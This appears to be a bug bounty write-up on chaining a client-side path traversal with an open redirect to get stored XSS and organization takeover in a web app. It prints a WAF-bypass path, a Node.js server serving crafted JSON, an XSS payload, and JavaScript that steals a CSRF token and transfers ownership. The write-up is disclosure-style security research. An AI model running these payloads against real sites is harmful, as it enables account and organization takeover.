# 1-click oraganiztion takeover chaining a cspt with open redirect

cspt is very common among bug bounty programs, although most of the times you can't report it alone, you can chain it with other types of bugs to achive a higher impact. 

## finding the cspt:

for finding cspts i always use the amazing [geko]() extension by [bu4factor](),while using the application i identified and verfied a cspt bug inside the path:

`https://target.com/docs/1e64dfa4-bee3-4edb-9547-817d3b3cc394`

so i tried:

`https://target.com/docs/1e64dfa4-bee3-4edb-9547-817d3b3cc394%2f..%2fcspt`

but i was blocked by the waf, so i tried using %5c:

`https://target.com/docs/1e64dfa4-bee3-4edb-9547-817d3b3cc394%5c..%5ccspt`

and it worked!!


## finding the open redirect:

one of the application functionalities allows you to integrate third party websites, and for this docs integeration it asks you to add the tenant name(directly apended to the third party tenants domain) then authenticate to the tenant. 

![image](../image.png)

so in the tenant name i tried adding special characters like (/ ? " ') and the application accepted it! i tried testing for other types of bugs like xss and ssrf but noting worked but i found that i can do this.

![image](../image%20copy.png)

like that i can add my own domain as a tenant! in the next step for adding the integeration the application asks you to verify authentication, clicking of verfiy the authentication button redirects you to your tenant in this case it redirect to my own website!! the open redirect endpoints looked something like this:

`https://target.com/authenticate/intgeration/verify`

## the first issue: javascript Type error

after finding the open redirect i can now control the response of the webpage with the cspt to come from my own server, fortunatly the original response contained a json object that controls the whole webpage content.but the application uses vue js so direct xss won't work here, so i copied the original json response hosted it in my own server and played with it, but nothing showed i check the console and found this error:

![image](../image%20copy%202.png)

debuging using  the dev tools it turned out that this piece of code broke because of my json reponse and expects it to be an array, after investigation it turns out that the cspt manipulated another request that should return an array but now its returning my json object instead. 

so to solve this issue i realized that my cspt affected three different requests made by same page, two of them expects a json object and they where different but i can nest all the data needed to make the code work inside one object. and the third one expects an array. so i programed my server to responed with a json obect for the first two requests to this endpoint and in the third request it should respond with an empty array. here is the code i used:

```
let hitcount = 0;
app.get('/exploit.json', (req, res) => {
        hitcount++
        if(hitcount == 3){
                res.sendFile(path.join(__dirname, 'arr.json'))
        }
        else{
        res.sendFile(path.join(__dirname, 'exploit.json'))
        }

          if (resetTimer) clearTimeout(resetTimer);
  resetTimer = setTimeout(() => {
    hitcount = 0;
    resetTimer = null;
  }, 5000);
});
```


## the second issue finding XSS sink

to give you a background the page with the cspt is a page where the user can set multiple types of questions checkbox, text fields, yes or now, etc..., injecting into these fields didn't excute any JS, so i looked again inside the application to see what other questions types i add to the page, and while reading the questions types and their description i found that one of them allows for adding rich text, the question description was as fallows:

```
                {
                    "order": 1,
                    "active": true,
                    "questionType": "RICHTEXT",
                    "Display": "Rich Text (HTML)",
                    "options": [{
                    "short": "Short text",
                    "answer": ""
                }]
                }
```

so i copied the question json, and injected `<img src=x onerror=alert(document.domain)>` in the question answer field and poped the XSS!!

![image](../image%20copy%203.png)


## Escaltion To organization takeover

at this point i have a XSS with the same organization requiring admin privelages(only admins can edit integerations settings), with the session cookies beings http only, i tried self XSS esclatoin techniques but it didn't work as i didn't have a logout csrf, so the only impact i could find is to steal the csrf token and take ownership of the organization, this is the exploit code:

```
let hackerid = 12345;
let myform = document.createElement('form');
myform.target = '_blank';
myform.action = 'https://traget.com/users/transfer-owner';
myform.method = 'POST';
let id = document.createElement('input');
id.name = 'new-owner';
id.value = hackerid;
id.type = 'text';
let input = document.createElement('input');
input.name = 'csrfmiddlewaretoken';
input.value = document.querySelector('input[name=csrftoken]').value;
input.type = 'text'; myform.appendChild(id);
myform.appendChild(input);
document.body.appendChild(myform); myform.submit();
```

the exploit create a form and two input element, then steals the csrf token via `document.querySelector('input[name=csrftoken]').value;` and stores it in the input.value and the second element contains the hacerid, then javascript auto submit the form and transfers ownership to the hacker.


